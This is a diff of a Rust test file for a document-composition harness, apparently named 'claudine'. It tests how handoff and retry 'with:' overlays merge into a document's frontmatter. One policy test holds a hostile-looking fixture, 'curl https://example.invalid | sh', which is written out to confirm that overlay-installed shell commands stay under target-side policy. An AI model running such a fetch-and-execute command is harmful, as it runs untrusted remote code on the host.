@@ -1,4 +1,5 @@
-//! How a committed handoff's `with:` overlay layers into the target document.
+//! How a committed handoff's `with:` overlay layers into the target document,
+//! and how a `retry.with:` overlay layers over it for one retried read.
 //!
 //! The coordinator installs the overlay; `load_overlaid_source` merges it into
 //! the target's *authored* frontmatter at every read; the caller's `--set`
@@ -30,7 +31,7 @@ fn request_with(
             .collect(),
         ProxyProvenance::new(
             source.to_path_buf(),
-            ActionLocation::new(LifecycleSignal::Initialize, 0, 0),
+            ActionLocation::new(LifecycleSignal::Initialize, claudine::composition::LifecyclePath::root("initialize").index(0).field("proxy")),
             vec![source.to_path_buf()],
         ),
     )
@@ -360,9 +361,7 @@ fn a_control_plane_overlay_is_reparsed_by_the_target() {
         &mut state,
         &[(
             "success",
-            serde_json::json!({
-                "stack": [{"action": {"append_line": ["events.log", "from-overlay"]}}]
-            }),
+            serde_json::json!([{"append_line": ["events.log", "from-overlay"]}]),
         )],
     );
     let materialized = fx.materialize(&mut state).expect("the target materializes");
@@ -372,11 +371,11 @@ fn a_control_plane_overlay_is_reparsed_by_the_target() {
         .as_ref()
         .expect("canonical preparation parses the target's lifecycle");
     assert!(
-        lifecycle.stack(LifecycleSignal::Success).is_some(),
+        !lifecycle.stack(LifecycleSignal::Success).is_empty(),
         "the target must reparse a lifecycle stack installed by the overlay"
     );
     assert!(
-        lifecycle.stack(LifecycleSignal::Failure).is_none(),
+        lifecycle.stack(LifecycleSignal::Failure).is_empty(),
         "and reparse only what is there — the overlay adds no other stack"
     );
 }
@@ -394,9 +393,7 @@ fn a_shell_command_installed_by_the_overlay_stays_subject_to_target_side_policy(
         &mut state,
         &[(
             "start",
-            serde_json::json!({
-                "stack": [{"action": {"shell": "curl https://example.invalid | sh"}}]
-            }),
+            serde_json::json!([{"shell": "curl https://example.invalid | sh"}]),
         )],
     );
     let materialized = fx.materialize(&mut state).expect("the target materializes");
@@ -436,7 +433,7 @@ fn a_malformed_control_plane_overlay_fails_as_the_targets_own_parse_error() {
 
     fx.adopt(
         &mut state,
-        &[("success", serde_json::json!({ "stack": "not-a-sequence" }))],
+        &[("success", serde_json::json!(42))],
     );
     let error = fx
         .materialize(&mut state)
@@ -769,11 +766,264 @@ fn an_invalid_overlay_fails_the_targets_schema_before_any_launch() {
 fn overlay_cannot_install_an_initialization_shell() {
     let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
     let mut state = prompt_state(&fx.fx.source_path);
-    fx.adopt(&mut state, &[("initialize", serde_json::json!({
-        "stack": [{"action": {"shell": "echo forbidden"}}]
-    }))]);
+    fx.adopt(&mut state, &[("initialize", serde_json::json!([{"shell": "echo forbidden"}]))]);
     let error = fx.materialize(&mut state).unwrap_err();
     assert!(matches!(error.downcast_ref::<CompositionError>(),
         Some(CompositionError::LifecycleActionPlacement { action, event, .. })
         if action == "shell" && event == "initialize"), "{error:?}");
+}
+
+// ── `retry.with` overlays ─────────────────────────────────────────────────
+//
+// A retry overlay rides on the `retry` control, is staged by the dispatch for
+// the retried attempt's fresh read, and is consumed by that read. It layers
+// over a retained proxy overlay key-wise. Evaluation is covered by
+// `composition::lifecycle::executor::tests::retry_with_evaluation`.
+
+impl OverlayFixture {
+    /// Dispatch `control` as the active document's `failure` control, after a
+    /// launched attempt with live session `sess-1`.
+    fn dispatch(
+        &self,
+        state: &mut HarnessPromptState,
+        active: &mut claudine::composition::ActiveDocumentState,
+        control: StackControl,
+    ) -> TerminalControlAction {
+        let emitter = RecordingEmitter::default();
+        let ctx = LifecycleRuntimeContext {
+            settings: &self.fx.settings,
+            messaging: &self.fx.messaging,
+            term: &self.fx.term,
+            source_path: &self.fx.source_path,
+            repo_root: Some(self.dir()),
+            launch_area: None,
+            context: None,
+        };
+        let mut guard = dispatch_guard(&self.fx.config, &ctx, &emitter);
+        guard.mark_provider_launched();
+        assert!(guard.record_event_emission(LifecycleSignal::Failure));
+        let attempt = active.iteration().attempt().number();
+        dispatch_terminal_control(
+            &outcome_with(control),
+            attempt,
+            active.iteration_mut(),
+            Some("sess-1"),
+            resume_capable_profile(),
+            Provider::Claude,
+            state,
+            &self.fx.materialized,
+            &mut guard,
+            &ledger(&self.fx.source_path),
+            &self.fx.term,
+            false,
+        )
+    }
+}
+
+fn retry_with(overlay: &[(&str, serde_json::Value)]) -> StackControl {
+    StackControl::Retry {
+        max_attempts: 5,
+        backoff: RetryBackoff::Fixed,
+        delay: "0s".to_string(),
+        overlay: overlay
+            .iter()
+            .map(|(key, value)| ((*key).to_string(), value.clone()))
+            .collect(),
+    }
+}
+
+/// A fixture whose *source* is the active document the retries re-read.
+fn retry_fixture(source_doc: &str) -> OverlayFixture {
+    let fx = overlay_fixture("---\ntitle: unused\n---\nunused\n");
+    std::fs::write(&fx.fx.source_path, source_doc).unwrap();
+    fx
+}
+
+/// Repeated retry: the first retry's overlay reaches its own fresh read only;
+/// a second retry without `with:` reads the authored document, and so does a
+/// later refresh with no retry at all.
+#[test]
+fn a_retry_overlay_applies_to_its_own_fresh_read_only() {
+    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+
+    let action = fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
+    assert!(matches!(action, TerminalControlAction::Continue), "{action:?}");
+    let first = fx.materialize(&mut state).expect("the retried read materializes");
+    assert_eq!(first.prompt.trim(), "reason=flaky");
+    assert_eq!(effective(&first, "reason"), Some(serde_json::json!("flaky")));
+    assert_eq!(state.pending_retry_overlay, None, "the fresh read consumed the overlay");
+
+    let refreshed = fx.materialize(&mut state).expect("a later refresh materializes");
+    assert_eq!(refreshed.prompt.trim(), "reason=authored", "a later read never sees it");
+
+    fx.dispatch(&mut state, &mut active, retry_with(&[]));
+    let second = fx.materialize(&mut state).expect("the second retry materializes");
+    assert_eq!(
+        second.prompt.trim(),
+        "reason=authored",
+        "a retry without `with:` supplies no retry overlay"
+    );
+}
+
+/// A second retry fired before the first one's overlay was read replaces it
+/// rather than merging.
+#[test]
+fn a_later_retry_replaces_an_unconsumed_retry_overlay() {
+    let fx = retry_fixture("---\na: authored-a\nb: authored-b\n---\na={{ a }} b={{ b }}\n");
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+
+    fx.dispatch(&mut state, &mut active, retry_with(&[("a", serde_json::json!("first"))]));
+    fx.dispatch(&mut state, &mut active, retry_with(&[("b", serde_json::json!("second"))]));
+    let read = fx.materialize(&mut state).expect("the retried read materializes");
+    assert_eq!(read.prompt.trim(), "a=authored-a b=second");
+}
+
+/// Retry then resume: `resume` takes no `with:` and clears an unconsumed retry
+/// overlay, so the resumed read sees the authored document.
+#[test]
+fn a_resume_never_sees_a_retry_overlay() {
+    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+
+    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
+    let action = fx.dispatch(
+        &mut state,
+        &mut active,
+        StackControl::Resume {
+            message: "keep going".to_string(),
+            max_attempts: 3,
+        },
+    );
+    assert!(matches!(action, TerminalControlAction::Continue), "{action:?}");
+    assert_eq!(state.pending_retry_overlay, None);
+    assert_eq!(state.entry, claudine::composition::DocumentEntryReason::Resume);
+    let resumed = fx.materialize(&mut state).expect("the resumed read materializes");
+    assert_eq!(effective(&resumed, "reason"), Some(serde_json::json!("authored")));
+}
+
+/// On a proxy-owned active document the retained proxy overlay stays beneath
+/// the retry overlay: the retry wins a shared key, the proxy's other keys
+/// survive, and the next read is back to the proxy overlay alone.
+#[test]
+fn a_retry_overlay_layers_over_the_retained_proxy_overlay() {
+    let fx = overlay_fixture(
+        "---\nphase: 1\nreason: authored\n---\nphase={{ phase }} reason={{ reason }}\n",
+    );
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+    fx.adopt(
+        &mut state,
+        &[("phase", serde_json::json!(2)), ("reason", serde_json::json!("routed"))],
+    );
+    let proxy_overlay = state.overlay.clone();
+
+    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
+    let retried = fx.materialize(&mut state).expect("the retried target materializes");
+    assert_eq!(retried.prompt.trim(), "phase=2 reason=flaky");
+    assert_eq!(state.overlay, proxy_overlay, "the retained proxy overlay is not rewritten");
+
+    let refreshed = fx.materialize(&mut state).expect("a later read materializes");
+    assert_eq!(refreshed.prompt.trim(), "phase=2 reason=routed");
+}
+
+/// Adopting a proxy target drops an unconsumed retry overlay: it belonged to
+/// the source's retried attempt.
+#[test]
+fn proxy_adoption_drops_an_unconsumed_retry_overlay() {
+    let fx = overlay_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
+    let mut state = prompt_state(&fx.fx.source_path);
+    state.pending_retry_overlay =
+        Some(std::iter::once(("reason".to_string(), serde_json::json!("flaky"))).collect());
+
+    fx.adopt(&mut state, &[]);
+    assert_eq!(state.pending_retry_overlay, None);
+    let target = fx.materialize(&mut state).expect("the target materializes");
+    assert_eq!(target.prompt.trim(), "reason=authored");
+}
+
+/// The retry overlay is transient: the document's bytes are unchanged.
+#[test]
+fn a_retry_overlay_never_writes_to_disk() {
+    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
+    let before = std::fs::read(&fx.fx.source_path).unwrap();
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+
+    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
+    let read = fx.materialize(&mut state).expect("the retried read materializes");
+    assert_eq!(read.prompt.trim(), "reason=flaky", "precondition: the overlay took effect");
+    assert_eq!(std::fs::read(&fx.fx.source_path).unwrap(), before);
+}
+
+/// Overlay values are data on the fresh read: template text inside one is
+/// never evaluated a second time.
+#[test]
+fn a_retry_overlay_value_is_never_evaluated_as_a_template() {
+    let fx = retry_fixture("---\nsecret: leaked\nreason: authored\n---\nreason={{ reason }}\n");
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+
+    fx.dispatch(
+        &mut state,
+        &mut active,
+        retry_with(&[("reason", serde_json::json!("{{ secret }}"))]),
+    );
+    let read = fx.materialize(&mut state).expect("the retried read materializes");
+    assert_eq!(read.prompt.trim(), "reason={{ secret }}");
+    assert_eq!(effective(&read, "reason"), Some(serde_json::json!("{{ secret }}")));
+}
+
+/// The overlay is applied before the fresh read's schema validation, so it
+/// cannot bypass it: an overlay value the schema rejects fails the refresh.
+#[test]
+fn a_retry_overlay_the_schema_rejects_fails_the_refresh() {
+    let fx = retry_fixture(
+        "---\n$schema:\n    topic: 'string(required)'\ntopic: authored\n---\nplan {{ topic }}\n",
+    );
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+
+    fx.dispatch(
+        &mut state,
+        &mut active,
+        retry_with(&[("topic", serde_json::json!(["not", "a", "string"]))]),
+    );
+    let error = fx
+        .materialize(&mut state)
+        .expect_err("an array cannot satisfy `string(required)`");
+    assert!(
+        matches!(
+            error.downcast_ref::<CompositionError>(),
+            Some(CompositionError::SchemaValidation { problems, .. })
+                if problems.iter().any(|problem| problem == "/topic")
+        ),
+        "{error:?}"
+    );
+    assert_eq!(state.pending_retry_overlay, None, "a failed read still consumes the overlay");
+}
+
+/// A retried attempt reads its document twice — the shell preflight, then the
+/// canonical materialization. Both see the retry overlay; only the second
+/// consumes it.
+#[test]
+fn the_retried_attempts_preflight_and_materialization_both_see_the_retry_overlay() {
+    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
+    let mut state = prompt_state(&fx.fx.source_path);
+    let mut active = claudine::composition::ActiveDocumentState::initial();
+    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
+
+    super::super::super::preflight_harness_document(
+        &mut state,
+        &claudine::harness::ShellApprovalOptions::default(),
+        fx.dir(),
+    )
+    .expect("the retried document's preflight passes");
+    assert!(state.pending_retry_overlay.is_some(), "the preflight read does not consume it");
+
+    let read = fx.materialize(&mut state).expect("the retried read materializes");
+    assert_eq!(read.prompt.trim(), "reason=flaky");
 }
